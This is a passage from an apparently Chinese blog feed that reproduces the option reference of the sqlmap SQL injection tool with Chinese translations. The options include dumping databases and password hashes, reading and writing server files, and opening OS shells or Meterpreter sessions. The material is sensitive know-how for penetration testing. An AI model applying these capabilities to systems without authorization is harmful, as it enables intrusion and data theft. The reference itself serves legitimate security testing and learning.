<h3 id="Injection（注入）"><a href="#Injection（注入）" class="headerlink" title="Injection（注入）"></a>Injection（注入）</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Injection（注入）:</span><br><span class="line">​</span><br><span class="line">These options can be used <span class="keyword">to</span> specify which parameters <span class="keyword">to</span> test <span class="keyword">for</span>, provide custom injection payloads <span class="keyword">and</span> optional tampering scripts</span><br><span class="line"><span class="comment">##  这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</span></span><br><span class="line">​</span><br><span class="line">-p TESTPARAMETER Testable parameter(s)</span><br><span class="line"><span class="comment">## 可测试的参数（S）</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--skip</span>=SKIP Skip testing <span class="keyword">for</span> given parameter(s)</span><br><span class="line"><span class="comment">## 跳过对给定参数的测试</span></span><br><span class="line">​</span><br><span class="line">--skip-static Skip testing parameters that <span class="keyword">not</span> appear <span class="keyword">to</span> be dynamic</span><br><span class="line"><span class="comment">## 跳过测试不显示为动态的参数</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--param-exclude</span>=.. Regexp <span class="keyword">to</span> exclude parameters <span class="keyword">from</span> testing (e.g. <span class="string">&quot;ses&quot;</span>)</span><br><span class="line"><span class="comment">## 使用正则表达式排除参数进行测试（e.g. &quot;ses&quot;）</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--dbms</span>=DBMS Force back-end DBMS <span class="keyword">to</span> this value</span><br><span class="line"><span class="comment">## 强制后端的DBMS为此值</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--dbms-cred</span>=DBMS.. DBMS authentication credentials (user:password)</span><br><span class="line"><span class="comment">## DBMS认证凭证(user:password)</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--os</span>=OS Force back-end DBMS operating<span class="built_in"> system </span><span class="keyword">to</span> this value</span><br><span class="line"><span class="comment">## 强制后端的DBMS操作系统为这个值</span></span><br><span class="line">​</span><br><span class="line">--invalid-bignum Use big numbers <span class="keyword">for</span> invalidating values</span><br><span class="line"><span class="comment">## 使用大数字使值无效</span></span><br><span class="line">​</span><br><span class="line">--invalid-logical Use logical operations <span class="keyword">for</span> invalidating values</span><br><span class="line"><span class="comment">## 使用逻辑操作使值无效</span></span><br><span class="line">​</span><br><span class="line">--invalid-string Use random strings <span class="keyword">for</span> invalidating values</span><br><span class="line"><span class="comment">## 使用随机字符串使值无效</span></span><br><span class="line">​</span><br><span class="line">--no-cast Turn off payload casting mechanism</span><br><span class="line"><span class="comment">## 关闭有效载荷铸造机制</span></span><br><span class="line">​</span><br><span class="line">--no-escape Turn off string escaping mechanism</span><br><span class="line"><span class="comment">## 关闭字符串转义机制</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--prefix</span>=PREFIX Injection payload<span class="built_in"> prefix </span>string</span><br><span class="line"><span class="comment">## 注入payload字符串前缀</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--suffix</span>=SUFFIX Injection payload suffix string</span><br><span class="line"><span class="comment">## 注入payload字符串后缀</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--tamper</span>=TAMPER Use given script(s) <span class="keyword">for</span> tampering injection data</span><br><span class="line"><span class="comment">## 使用给定的脚本（S）篡改注入数据</span></span><br></pre></td></tr></table></figure>


<h3 id="Detection（检测）"><a href="#Detection（检测）" class="headerlink" title="Detection（检测）"></a>Detection（检测）</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Detection（检测）:</span><br><span class="line">These options can be used <span class="keyword">to</span> customize the detection phase</span><br><span class="line"><span class="comment">## 这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--level</span>=LEVEL Level of tests <span class="keyword">to</span> perform (1-5,<span class="built_in"> default </span>1)</span><br><span class="line"><span class="comment">## 执行测试的等级（1-5，默认为1）</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--risk</span>=RISK Risk of tests <span class="keyword">to</span> perform (1-3,<span class="built_in"> default </span>1)</span><br><span class="line"><span class="comment">## 执行测试的风险（0-3，默认为1）</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--string</span>=STRING String <span class="keyword">to</span> match when query is evaluated <span class="keyword">to</span> <span class="literal">True</span></span><br><span class="line"><span class="comment">##  查询时有效时在页面匹配字符串</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--not-string</span>=NOT.. String <span class="keyword">to</span> match when query is evaluated <span class="keyword">to</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">## 当查询求值为无效时匹配的字符串</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--regexp</span>=REGEXP Regexp <span class="keyword">to</span> match when query is evaluated <span class="keyword">to</span> <span class="literal">True</span></span><br><span class="line"><span class="comment">## 查询时有效时在页面匹配正则表达式</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--code</span>=CODE HTTP code <span class="keyword">to</span> match when query is evaluated <span class="keyword">to</span> <span class="literal">True</span></span><br><span class="line"><span class="comment">## 当查询求值为True时匹配的HTTP代码</span></span><br><span class="line">​</span><br><span class="line">--text-only Compare pages based only on the textual content</span><br><span class="line"><span class="comment">## 仅基于在文本内容比较网页</span></span><br><span class="line">​</span><br><span class="line">--titles Compare pages based only on their titles</span><br><span class="line"><span class="comment">##  仅根据他们的标题进行比较</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="Techniques（技巧）"><a href="#Techniques（技巧）" class="headerlink" title="Techniques（技巧）"></a>Techniques（技巧）</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Techniques（技巧）:</span><br><span class="line">These options can be used <span class="keyword">to</span> tweak testing of specific SQL injection techniques</span><br><span class="line"><span class="comment">## 这些选项可用于调整具体的SQL注入测试。</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--technique</span>=TECH SQL injection techniques <span class="keyword">to</span> use (default <span class="string">&quot;BEUSTQ&quot;</span>)</span><br><span class="line"><span class="comment">## SQL 注入技术测试（默认BEUST）</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--time-sec</span>=TIMESEC Seconds <span class="keyword">to</span> delay the DBMS response (default 5)</span><br><span class="line"><span class="comment">##  DBMS响应的延迟时间（默认为5秒）</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--union-cols</span>=UCOLS Range of columns <span class="keyword">to</span> test <span class="keyword">for</span> UNION query SQL injection</span><br><span class="line"><span class="comment">##  定列范围用于测试UNION查询注入</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--union-char</span>=UCHAR Character <span class="keyword">to</span> use <span class="keyword">for</span> bruteforcing number of columns</span><br><span class="line"><span class="comment">##  用于暴力猜解列数的字符</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--union-from</span>=UFROM Table <span class="keyword">to</span> use <span class="keyword">in</span> <span class="keyword">FROM</span> part of UNION query SQL injection</span><br><span class="line"><span class="comment">##  要在UNION查询SQL注入的FROM部分使用的表</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--dns-domain</span>=DNS.. Domain name used <span class="keyword">for</span><span class="built_in"> DNS </span>exfiltration attack</span><br><span class="line"><span class="comment">##  域名用于DNS漏出攻击</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--second-order</span>=S.. Resulting<span class="built_in"> page </span>URL searched <span class="keyword">for</span> second-order response</span><br><span class="line"><span class="comment">## 生成页面的URL搜索为second-order响应</span></span><br></pre></td></tr></table></figure>


<h3 id="Fingerprint（指纹）"><a href="#Fingerprint（指纹）" class="headerlink" title="Fingerprint（指纹）"></a>Fingerprint（指纹）</h3><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">Fingerprint（指纹）:</span><br><span class="line">​</span><br><span class="line">-f, <span class="comment">--fingerprint Perform an extensive DBMS version fingerprint</span></span><br><span class="line"><span class="comment">## 执行检查广泛的DBMS版本指纹</span></span><br></pre></td></tr></table></figure>


<h3 id="Enumeration（枚举）"><a href="#Enumeration（枚举）" class="headerlink" title="Enumeration（枚举）"></a>Enumeration（枚举）</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Enumeration（枚举）:</span><br><span class="line">​</span><br><span class="line">These options can be used <span class="keyword">to</span> enumerate the back-end database management<span class="built_in"> system </span>information, structure <span class="keyword">and</span> data contained <span class="keyword">in</span> the tables. Moreover you can <span class="builtin-name">run</span> your own SQL statements</span><br><span class="line"><span class="comment">## 这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。</span></span><br><span class="line">​</span><br><span class="line">-a, --all Retrieve everything</span><br><span class="line"><span class="comment">## 检索一切</span></span><br><span class="line">​</span><br><span class="line">-b, --banner Retrieve DBMS banner</span><br><span class="line"><span class="comment">## 检索数据库管理系统的标识</span></span><br><span class="line">​</span><br><span class="line">--current-user Retrieve DBMS current<span class="built_in"> user</span></span><br><span class="line"><span class="built_in"></span><span class="comment">##  检索数据库管理系统的 标识</span></span><br><span class="line">​</span><br><span class="line">--current-db Retrieve DBMS current database</span><br><span class="line"><span class="comment">## 检索数据库管理系统当前数据库</span></span><br><span class="line">​</span><br><span class="line">-hostname Retrieve DBMS<span class="built_in"> server </span>hostname</span><br><span class="line"><span class="comment">## 检索数据库服务器的主机名</span></span><br><span class="line">​</span><br><span class="line">--is-dba Detect <span class="keyword">if</span> the DBMS current<span class="built_in"> user </span>is DBA</span><br><span class="line"><span class="comment">## 检测DBMS当前用户是否DBA</span></span><br><span class="line">​</span><br><span class="line">--users Enumerate DBMS<span class="built_in"> users</span></span><br><span class="line"><span class="built_in"></span><span class="comment">## 枚举数据库管理系统用户</span></span><br><span class="line">​</span><br><span class="line">--passwords Enumerate DBMS<span class="built_in"> users </span>password hashes</span><br><span class="line"><span class="comment">## 枚举数据库管理系统用户密码哈希</span></span><br><span class="line">​</span><br><span class="line">--privileges Enumerate DBMS<span class="built_in"> users </span>privileges</span><br><span class="line"><span class="comment">## 枚举数据库管理系统用户的权限</span></span><br><span class="line">​</span><br><span class="line">--roles Enumerate DBMS<span class="built_in"> users </span>roles</span><br><span class="line"><span class="comment">## 枚举数据库管理系统用户的角色</span></span><br><span class="line">​</span><br><span class="line">--dbs Enumerate DBMS databases</span><br><span class="line"><span class="comment">## 枚举数据库管理系统数据库</span></span><br><span class="line">​</span><br><span class="line">--tables Enumerate DBMS database tables</span><br><span class="line"><span class="comment">##  枚举的DBMS数据库中的表</span></span><br><span class="line">​</span><br><span class="line">--columns Enumerate DBMS database table columns</span><br><span class="line"><span class="comment">## 枚举DBMS数据库表列</span></span><br><span class="line">​</span><br><span class="line">--schema Enumerate DBMS schema</span><br><span class="line"><span class="comment">## 枚举数据库架构</span></span><br><span class="line">​</span><br><span class="line">--count Retrieve number of entries <span class="keyword">for</span> table(s)</span><br><span class="line"><span class="comment">## 检索表的条目数</span></span><br><span class="line">​</span><br><span class="line">--dump Dump DBMS database table entries</span><br><span class="line"><span class="comment">##  转储数据库管理系统的数据库中的表项</span></span><br><span class="line">​</span><br><span class="line">--dump-all Dump all DBMS databases tables entries</span><br><span class="line"><span class="comment">## 转储数据库管理系统的数据库中的表项</span></span><br><span class="line">​</span><br><span class="line">--search Search column(s), table(s) <span class="keyword">and</span>/<span class="keyword">or</span> database name(s)</span><br><span class="line"><span class="comment">##  搜索列（S），表（S）和/或数据库名称（S）</span></span><br><span class="line">​</span><br><span class="line">--comments Retrieve DBMS comments</span><br><span class="line"><span class="comment">##  检索数据库的comments(注释、评论)</span></span><br><span class="line">​</span><br><span class="line">-D DB DBMS database <span class="keyword">to</span> enumerate</span><br><span class="line"><span class="comment">## 要进行枚举的数据库名</span></span><br><span class="line">​</span><br><span class="line">-T TBL DBMS database table(s) <span class="keyword">to</span> enumerate</span><br><span class="line"><span class="comment">##  要进行枚举的数据库表</span></span><br><span class="line">​</span><br><span class="line">-C COL DBMS database table column(s) <span class="keyword">to</span> enumerate</span><br><span class="line"><span class="comment">## 要进行枚举的数据库列</span></span><br><span class="line">​</span><br><span class="line">-X EXCLUDECOL DBMS database table column(s) <span class="keyword">to</span> <span class="keyword">not</span> enumerate</span><br><span class="line"><span class="comment">## 要不进行枚举的数据库列</span></span><br><span class="line">​</span><br><span class="line">-U<span class="built_in"> USER </span>DBMS<span class="built_in"> user </span><span class="keyword">to</span> enumerate</span><br><span class="line"><span class="comment">## 用来进行枚举的数据库用户</span></span><br><span class="line">​</span><br><span class="line">--exclude-sysdbs Exclude DBMS<span class="built_in"> system </span>databases when enumerating tables</span><br><span class="line"><span class="comment">##  枚举表时排除系统数据库</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--pivot-column</span>=P.. Pivot column name</span><br><span class="line"><span class="comment">## 主列名称</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--where</span>=DUMPWHERE Use WHERE condition <span class="keyword">while</span> table dumping</span><br><span class="line"><span class="comment">## 使用WHERE条件进行表转储</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--start</span>=LIMITSTART First query output entry <span class="keyword">to</span> retrieve</span><br><span class="line"><span class="comment">##  第一个查询输出进入检索</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--stop</span>=LIMITSTOP Last query output entry <span class="keyword">to</span> retrieve</span><br><span class="line"><span class="comment">## 最后查询的输出进入检索</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--first</span>=FIRSTCHAR First query output word character <span class="keyword">to</span> retrieve</span><br><span class="line"><span class="comment">## 第一个查询输出字的字符检索</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--last</span>=LASTCHAR Last query output word character <span class="keyword">to</span> retrieve</span><br><span class="line"><span class="comment">## 最后查询的输出字字符检索</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--sql-query</span>=QUERY SQL statement <span class="keyword">to</span> be executed</span><br><span class="line"><span class="comment">## 要执行的SQL语句</span></span><br><span class="line">​</span><br><span class="line">--sql-shell Prompt <span class="keyword">for</span> an interactive SQL shell</span><br><span class="line"><span class="comment">## 提示交互式SQL的shell</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--sql-file</span>=SQLFILE Execute SQL statements <span class="keyword">from</span> given file(s)</span><br><span class="line"><span class="comment">## 从给定文件执行SQL语句</span></span><br></pre></td></tr></table></figure>


<h3 id="Brute-Force（蛮力）"><a href="#Brute-Force（蛮力）" class="headerlink" title="Brute Force（蛮力）"></a>Brute Force（蛮力）</h3><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">Brute force（蛮力）:</span><br><span class="line">​</span><br><span class="line">These options can be used <span class="keyword">to</span> <span class="built_in">run</span> brute force checks</span><br><span class="line"><span class="comment">## 这些选项可以被用来运行蛮力检查。</span></span><br><span class="line">​</span><br><span class="line"><span class="comment">--common-tables Check existence of common tables</span></span><br><span class="line"><span class="comment">## 检查存在共同表</span></span><br><span class="line">​</span><br><span class="line"><span class="comment">--common-columns Check existence of common columns</span></span><br><span class="line"><span class="comment">## 检查存在共同列</span></span><br></pre></td></tr></table></figure>


<h3 id="User-defined-function-injection（用户自定义函数注入）"><a href="#User-defined-function-injection（用户自定义函数注入）" class="headerlink" title="User-defined function injection（用户自定义函数注入）"></a>User-defined function injection（用户自定义函数注入）</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">User</span>-defined <span class="keyword">function</span> injection（用户自定义函数注入）:</span><br><span class="line">​</span><br><span class="line">These <span class="keyword">options</span> can be used <span class="keyword">to</span> <span class="keyword">create</span> custom <span class="keyword">user</span>-defined <span class="keyword">functions</span></span><br><span class="line">## 这些选项可以用来创建用户自定义函数。</span><br><span class="line">​</span><br><span class="line"><span class="comment">--udf-inject Inject custom user-defined functions</span></span><br><span class="line">## 注入用户自定义函数</span><br><span class="line">​</span><br><span class="line"><span class="comment">--shared-lib=SHLIB Local path of the shared library</span></span><br><span class="line">## 共享库的本地路径</span><br></pre></td></tr></table></figure>


<h3 id="File-system-access（访问文件系统）"><a href="#File-system-access（访问文件系统）" class="headerlink" title="File system access（访问文件系统）"></a>File system access（访问文件系统）</h3><figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line"><span class="keyword">File</span> system access（访问文件系统）:</span><br><span class="line">These options can be used <span class="keyword">to</span> access the back-<span class="keyword">end</span> database management system underlying <span class="keyword">file</span> system</span><br><span class="line">## 这些选项可以被用来访问后端数据库管理系统的底层文件系统。</span><br><span class="line">​</span><br><span class="line">--<span class="keyword">file</span>-<span class="keyword">read</span>=RFILE <span class="keyword">Read</span> a <span class="keyword">file</span> from the back-<span class="keyword">end</span> DBMS <span class="keyword">file</span> system</span><br><span class="line">## 从后端的数据库管理系统文件系统读取文件</span><br><span class="line">​</span><br><span class="line">--<span class="keyword">file</span>-<span class="keyword">write</span>=WFILE <span class="keyword">Write</span> a <span class="keyword">local</span> <span class="keyword">file</span> <span class="keyword">on</span> the back-<span class="keyword">end</span> DBMS <span class="keyword">file</span> system</span><br><span class="line">## 编辑后端的数据库管理系统文件系统上的本地文件</span><br><span class="line">​</span><br><span class="line">--<span class="keyword">file</span>-dest=DFILE Back-<span class="keyword">end</span> DBMS <span class="keyword">absolute</span> filepath <span class="keyword">to</span> <span class="keyword">write</span> <span class="keyword">to</span></span><br><span class="line">## 后端的数据库管理系统写入文件的绝对路径</span><br></pre></td></tr></table></figure>


<h3 id="Operating-system-access（操作系统访问）"><a href="#Operating-system-access（操作系统访问）" class="headerlink" title="Operating system access（操作系统访问）"></a>Operating system access（操作系统访问）</h3><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">Operating <span class="keyword">system</span> access（操作系统访问）:</span><br><span class="line">​</span><br><span class="line">These options can be used <span class="built_in">to</span> access <span class="keyword">the</span> back-<span class="function"><span class="keyword">end</span> <span class="title">database</span> <span class="title">management</span> <span class="title">system</span> <span class="title">underlying</span> <span class="title">operating</span> <span class="title">system</span></span></span><br><span class="line"><span class="comment">## 这些选项可以用于访问后端数据库管理系统的底层操作系统。</span></span><br><span class="line">​</span><br><span class="line"><span class="comment">--os-cmd=OSCMD Execute an operating system command</span></span><br><span class="line"><span class="comment">## 执行操作系统命令</span></span><br><span class="line">​</span><br><span class="line"><span class="comment">--os-shell Prompt for an interactive operating system shell</span></span><br><span class="line"><span class="comment">##  交互式的操作系统的shell</span></span><br><span class="line">​</span><br><span class="line"><span class="comment">--os-pwn Prompt for an OOB shell, Meterpreter or VNC</span></span><br><span class="line"><span class="comment">## 获取一个OOB shell，meterpreter或VNC</span></span><br><span class="line">​</span><br><span class="line"><span class="comment">--os-smbrelay One click prompt for an OOB shell, Meterpreter or VNC</span></span><br><span class="line"><span class="comment">## 一键获取一个OOB shell，meterpreter或VNC</span></span><br><span class="line">​</span><br><span class="line"><span class="comment">--os-bof Stored procedure buffer overflow exploitation</span></span><br><span class="line"><span class="comment">## 存储过程缓冲区溢出利用</span></span><br><span class="line">​</span><br><span class="line"><span class="comment">--priv-esc Database process user privilege escalation</span></span><br><span class="line"><span class="comment">## 数据库进程用户权限提升</span></span><br><span class="line">​</span><br><span class="line"><span class="comment">--msf-path=MSFPATH Local path where Metasploit Framework is installed Metasploit Framework</span></span><br><span class="line"><span class="comment">## 本地的安装路径</span></span><br><span class="line">​</span><br><span class="line"><span class="comment">--tmp-path=TMPPATH Remote absolute path of temporary files directory</span></span><br><span class="line"><span class="comment">## 远程临时文件目录的绝对路径</span></span><br></pre></td></tr></table></figure>


<h3 id="Windows-registry-access（Windows注册表访问）"><a href="#Windows-registry-access（Windows注册表访问）" class="headerlink" title="Windows registry access（Windows注册表访问）"></a>Windows registry access（Windows注册表访问）</h3><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">Windows registry access（Windows注册表访问）:</span><br><span class="line">​</span><br><span class="line">These options can be used <span class="keyword">to</span> access <span class="keyword">the</span> <span class="keyword">back</span>-<span class="keyword">end</span> database management system Windows registry</span><br><span class="line"><span class="comment">## 这些选项可以被用来访问后端数据库管理系统Windows注册表。</span></span><br><span class="line">​</span><br><span class="line"><span class="comment">--reg-read Read a Windows registry key value</span></span><br><span class="line"><span class="comment">## 读一个Windows注册表项值</span></span><br><span class="line">​</span><br><span class="line"><span class="comment">--reg-add Write a Windows registry key value data</span></span><br><span class="line"><span class="comment">## 写一个Windows注册表项值数据</span></span><br><span class="line">​</span><br><span class="line"><span class="comment">--reg-del Delete a Windows registry key value</span></span><br><span class="line"><span class="comment">## 删除Windows注册表键值</span></span><br><span class="line">​</span><br><span class="line"><span class="comment">--reg-key=REGKEY Windows registry key</span></span><br><span class="line"><span class="comment">## Windows注册表键</span></span><br><span class="line">​</span><br><span class="line"><span class="comment">--reg-value=REGVAL Windows registry key value</span></span><br><span class="line"><span class="comment">##  Windows注册表项值</span></span><br><span class="line">​</span><br><span class="line"><span class="comment">--reg-data=REGDATA Windows registry key value data</span></span><br><span class="line"><span class="comment">## Windows注册表键值数据</span></span><br><span class="line">​</span><br><span class="line"><span class="comment">--reg-type=REGTYPE Windows registry key value type</span></span><br><span class="line"><span class="comment">## Windows注册表项值类型</span></span><br></pre></td></tr></table></figure>


<h3 id="General（一般）"><a href="#General（一般）" class="headerlink" title="General（一般）"></a>General（一般）</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">General（一般）:</span><br><span class="line">​</span><br><span class="line">These options can be used <span class="keyword">to</span> <span class="builtin-name">set</span> some general working parameters</span><br><span class="line"><span class="comment">## 这些选项可以用来设置一些一般的工作参数。</span></span><br><span class="line">​</span><br><span class="line">-s SESSIONFILE Load session <span class="keyword">from</span> a stored (.sqlite) file</span><br><span class="line"><span class="comment">## 保存和恢复检索会话文件的所有数据</span></span><br><span class="line">​</span><br><span class="line">-t TRAFFICFILE Log all HTTP traffic into a textual file</span><br><span class="line"><span class="comment">## 记录所有HTTP流量到一个文本文件中</span></span><br><span class="line">​</span><br><span class="line">--batch Never ask <span class="keyword">for</span><span class="built_in"> user </span>input, use the<span class="built_in"> default </span>behaviour</span><br><span class="line"><span class="comment">## 从不询问用户输入，使用所有默认配置。</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--binary-fields</span>=.. Result fields having binary values (e.g. <span class="string">&quot;digest&quot;</span>)</span><br><span class="line"><span class="comment">## 具有二进制值的结果字段</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--charset</span>=CHARSET Force character encoding used <span class="keyword">for</span> data retrieval</span><br><span class="line"><span class="comment">## 强制用于数据检索的字符编码</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--crawl</span>=CRAWLDEPTH Crawl the website starting <span class="keyword">from</span> the target URL</span><br><span class="line"><span class="comment">## 从目标网址开始抓取网站</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--crawl-exclude</span>=.. Regexp <span class="keyword">to</span> exclude pages <span class="keyword">from</span> crawling (e.g. <span class="string">&quot;logout&quot;</span>)</span><br><span class="line"><span class="comment">## 正则表达式排除网页抓取</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--csv-del</span>=CSVDEL Delimiting character used <span class="keyword">in</span> CSV output (default <span class="string">&quot;,&quot;</span>)</span><br><span class="line"><span class="comment">## 分隔CSV输出中使用的字符</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--dump-format</span>=DU.. Format of dumped data (CSV (default), HTML <span class="keyword">or</span> SQLITE)</span><br><span class="line"><span class="comment">## 转储数据的格式</span></span><br><span class="line">​</span><br><span class="line">--eta Display <span class="keyword">for</span> each output the estimated time of arrival</span><br><span class="line"><span class="comment">## 显示每个输出的预计到达时间</span></span><br><span class="line">​</span><br><span class="line">--flush-session Flush session files <span class="keyword">for</span> current target</span><br><span class="line"><span class="comment">## 刷新当前目标的会话文件</span></span><br><span class="line">​</span><br><span class="line">--forms Parse <span class="keyword">and</span> test forms on target URL</span><br><span class="line"><span class="comment">## 在目标网址上解析和测试表单</span></span><br><span class="line">​</span><br><span class="line">--fresh-queries Ignore query results stored <span class="keyword">in</span> session file</span><br><span class="line"><span class="comment">## 忽略在会话文件中存储的查询结果</span></span><br><span class="line">​</span><br><span class="line">--hex Use DBMS hex function(s) <span class="keyword">for</span> data retrieval</span><br><span class="line"><span class="comment">## 使用DBMS hex函数进行数据检索</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--output-dir</span>=OUT.. Custom output directory path</span><br><span class="line"><span class="comment">## 自定义输出目录路径</span></span><br><span class="line">​</span><br><span class="line">--parse-errors Parse <span class="keyword">and</span> display DBMS <span class="builtin-name">error</span> messages <span class="keyword">from</span> responses</span><br><span class="line"><span class="comment">## 解析和显示响应中的DBMS错误消息</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--save</span>=SAVECONFIG Save options <span class="keyword">to</span> a configuration INI file</span><br><span class="line"><span class="comment">## 保存选项到INI配置文件</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--scope</span>=SCOPE Regexp <span class="keyword">to</span><span class="built_in"> filter </span>targets <span class="keyword">from</span> provided<span class="built_in"> proxy </span>log</span><br><span class="line"><span class="comment">## 使用正则表达式从提供的代理日志中过滤目标</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--test-filter</span>=TE.. Select tests by payloads <span class="keyword">and</span>/<span class="keyword">or</span> titles (e.g. ROW)</span><br><span class="line"><span class="comment">## 根据有效负载和/或标题(e.g. ROW)选择测试</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--test-skip</span>=TEST.. Skip tests by payloads <span class="keyword">and</span>/<span class="keyword">or</span> titles (e.g. BENCHMARK)</span><br><span class="line"><span class="comment">## 根据有效负载和/或标题跳过测试（e.g. BENCHMARK）</span></span><br><span class="line">​</span><br><span class="line">--update Update sqlmap</span><br><span class="line"><span class="comment">## 更新SqlMap</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="Miscellaneous（杂项）"><a href="#Miscellaneous（杂项）" class="headerlink" title="Miscellaneous（杂项）"></a>Miscellaneous（杂项）</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Miscellaneous（杂项）:</span><br><span class="line">​</span><br><span class="line">-z MNEMONICS Use short mnemonics (e.g. <span class="string">&quot;flu,bat,ban,tec=EU&quot;</span>)</span><br><span class="line"><span class="comment">## 使用简短的助记符</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--alert</span>=ALERT <span class="builtin-name">Run</span> host OS command(s) when SQL injection is found</span><br><span class="line"><span class="comment">## 在找到SQL注入时运行主机操作系统命令</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--answers</span>=ANSWERS <span class="builtin-name">Set</span> question answers (e.g. <span class="string">&quot;quit=N,follow=N&quot;</span>)</span><br><span class="line"><span class="comment">## 设置问题答案</span></span><br><span class="line">​</span><br><span class="line">--beep Beep on question <span class="keyword">and</span>/<span class="keyword">or</span> when SQL injection is found</span><br><span class="line"><span class="comment">## 发现SQL 注入时提醒</span></span><br><span class="line">​</span><br><span class="line">--cleanup Clean up the DBMS <span class="keyword">from</span> sqlmap specific UDF <span class="keyword">and</span> tables SqlMap</span><br><span class="line"><span class="comment">## 具体的UDF和表清理DBMS</span></span><br><span class="line">​</span><br><span class="line">--dependencies Check <span class="keyword">for</span> missing (non-core) sqlmap dependencies</span><br><span class="line"><span class="comment">## 检查是否缺少（非内核）sqlmap依赖关系</span></span><br><span class="line">​</span><br><span class="line">--disable-coloring <span class="builtin-name">Disable</span><span class="built_in"> console </span>output coloring</span><br><span class="line"><span class="comment">## 禁用控制台输出颜色</span></span><br><span class="line">​</span><br><span class="line"><span class="attribute">--gpage</span>=GOOGLEPAGE Use Google dork results <span class="keyword">from</span> specified<span class="built_in"> page </span>number</span><br><span class="line"><span class="comment">## 使用Google dork结果指定页码</span></span><br><span class="line">​</span><br><span class="line">--identify-waf Make a thorough testing <span class="keyword">for</span> a WAF/IPS/IDS protection</span><br><span class="line"><span class="comment">## 对WAF / IPS / IDS保护进行全面测试</span></span><br><span class="line">​</span><br><span class="line">--skip-waf Skip heuristic detection of WAF/IPS/IDS protection</span><br><span class="line"><span class="comment">## 跳过启发式检测WAF / IPS / IDS保护</span></span><br><span class="line">​</span><br><span class="line">--mobile Imitate smartphone through HTTP User-Agent header</span><br><span class="line"><span class="comment">##  通过HTTP User-Agent标头模仿智能手机</span></span><br><span class="line">​</span><br><span class="line">--offline Work <span class="keyword">in</span> offline mode (only use session data)</span><br><span class="line"><span class="comment">## 在离线模式下工作（仅使用会话数据）</span></span><br><span class="line">​</span><br><span class="line">--page-rank Display<span class="built_in"> page </span>rank (PR) <span class="keyword">for</span> Google dork results</span><br><span class="line"><span class="comment">##  Google dork结果显示网页排名（PR）</span></span><br><span class="line">​</span><br><span class="line">--purge-output Safely <span class="builtin-name">remove</span> all content <span class="keyword">from</span> output directory</span><br><span class="line"><span class="comment">##  安全地从输出目录中删除所有内容</span></span><br><span class="line">​</span><br><span class="line">--smart Conduct thorough tests only <span class="keyword">if</span> positive heuristic(s)</span><br><span class="line"><span class="comment">## 只有在正启发式时才进行彻底测试</span></span><br><span class="line">​</span><br><span class="line">--sqlmap-shell Prompt <span class="keyword">for</span> an interactive sqlmap shell</span><br><span class="line"><span class="comment">## 提示交互式 sqlmap shell</span></span><br><span class="line">​</span><br><span class="line">--wizard<span class="built_in"> Simple </span>wizard<span class="built_in"> interface </span><span class="keyword">for</span> beginner<span class="built_in"> users</span></span><br><span class="line"><span class="built_in"></span><span class="comment">## 给初级用户的简单向导界面</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>hacker</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title>Github 密码暂时禁用问题</title>
